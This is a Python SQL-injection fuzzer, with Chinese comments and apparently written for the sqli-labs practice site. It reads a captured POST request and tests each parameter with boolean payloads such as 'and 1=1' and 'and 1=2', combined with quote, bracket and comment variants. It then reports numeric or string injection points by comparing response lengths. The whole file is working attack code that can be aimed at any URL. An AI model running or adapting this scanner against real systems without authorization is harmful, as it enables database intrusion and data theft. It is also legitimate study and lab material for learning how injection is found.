# post注入
# 判断是数字型还是字符型注入
import requests
from termcolor import cprint
import threading
from queue import Queue

event = threading.Event()
event.set()
q = Queue(-1)

class post_Inject(threading.Thread):

    def __init__(self, data_path):
        threading.Thread.__init__(self)
        self.data_path = data_path
        self.url, self.params = self.get_url_parame()  # 获取请求网站的路径和post提交的参数
        self.paramsList = self.params.split('&')       # 将字符串型的参数改为已&分割的列表
        self.headers = {'Content-Type': 'application/x-www-form-urlencoded'}        # http://demo.sqli.com/Less-11/ 这一关验证了请求头的Content-Type，如果请求的时候不带上该值，都会报错
        self.standard_length = len(requests.post(self.url, data=self.params, headers=self.headers).text)  # 正常url响应包的长度
        self.Notes = ['--+', '%23', '#']  # 注释符
        self.quotes_brackets = ["'", '"', "')", "'))", '")', '"))']  # 单引号，双引号，括号  quotes:引号 brackets:括号
        self.nums = len(self.paramsList) + len(self.paramsList) * len(self.quotes_brackets) * len(self.Notes)   # 计算共请求次数
        cprint('[{}] 测试 : [{}] [{}]  :  {}'.format(self.nums, self.standard_length, self.url[:-1], self.params), 'red')     # 打印正常包的响应长度
        self.num = 1



    # 返回请求url的响应包长度
    def length_return(self, payload_data):
        #print(requests.post(self.url, data=payload_data, headers=self.headers).text)
        return len(requests.post(self.url, data=payload_data, headers=self.headers).text)

    # 攻击
    def attack(self):
        self.req_digit_payload()
        self.req_char_payload()


    # 从post包获取url和参数
    def get_url_parame(self):
        url = ''
        with open(self.data_path, 'rt') as f:
            for each in f:
                if 'Referer:' in each:
                    url = each.split(': ')[1]
            params = each.strip()
            return url, params

    # 请求数字型payload
    def req_digit_payload(self):
        '''
            因为是判断数字型，所以不需要注释符。
        '''
        for i in range(len(self.paramsList)):
            #temp = self.params[:]                   # 利用切片的复制，将原始参数赋给temp变量

            payload_data1 = self.paramsList[i] + '%20and%201=1'
            payload_data1 = self.params.replace(self.paramsList[i], payload_data1) # 构造成要提交的payload
            payload_length1 = self.length_return(payload_data1)       # payload_length1是请求带payload的响应包的长度
            payload_data2 = self.paramsList[i] + '%20and%201=2'
            payload_data2 = self.params.replace(self.paramsList[i], payload_data2)
            payload_length2 = self.length_return(payload_data2)
            print('[{}] 测试 : [{}] {}'.format(self.num, payload_length1, payload_data1))
            print('[{}] 测试 : [{}] {}'.format(self.num,payload_length2, payload_data2))

            # 为了过滤无论and 1=1还是and 1=2页面都不变的注入点, 因为如果都不变，则payload_length1等于payload_length2。例如第一关
            if self.standard_length == payload_length1 and payload_length1 != payload_length2:
                cprint('[{}] 数字型注入  [{}] payload : [{}]'.format(self.num, payload_length1, payload_data1), "red")
            else:
                cprint('[{}] 不是数字型注入。'.format(self.num), 'green')
            self.num += 1


    # 请求字符型payload
    def req_char_payload(self):
        '''
            因为是判断字符型，所以需要注释符。
        '''

        for i in range(len(self.paramsList)):
            for each in self.quotes_brackets:
                for note in self.Notes:
                    payload_data1 = self.paramsList[i] + "{} and 1=1 {}".format(each, note)
                    payload_data1 = self.params.replace(self.paramsList[i], payload_data1)  # 构造成要提交的payload
                    payload_length1 = self.length_return(payload_data1)  # payload_length1是请求带payload的响应包的长度
                    payload_data2 = self.paramsList[i] + "{} and 1=2 {}".format(each, note)
                    payload_data2 = self.params.replace(self.paramsList[i], payload_data2)
                    payload_length2 = self.length_return(payload_data2)
                    print('[{}] 测试 : [{}] {}'.format(self.num, payload_length1, payload_data1))
                    print('[{}] 测试 : [{}] {}'.format(self.num, payload_length2, payload_data2))
                    self.num += 1
                    # 为了过滤无论and 1=1还是and 1=2页面都不变的注入点, 因为如果都不变，则payload_length1等于payload_length2。例如第一关
                    if self.standard_length == payload_length1 and payload_length1 != payload_length2:
                        cprint('[{}] 字符型注入  [{}] payload : [{}]'.format(self.num, payload_length1, payload_data1), "red")
                    elif self.standard_length != payload_length1:
                        cprint('[{}] 可能存在字符型注入  [{}] payload : [{}]'.format(self.num,payload_length1, payload_data1), "blue")
                    else:
                        cprint('[{}] 不是字符型注入。'.format(self.num,), 'green')

data_path = r'C:\Users\Asus\Desktop\py\py3\project\sql_inject_fuzz\1.txt'
post_Inject(data_path).attack()
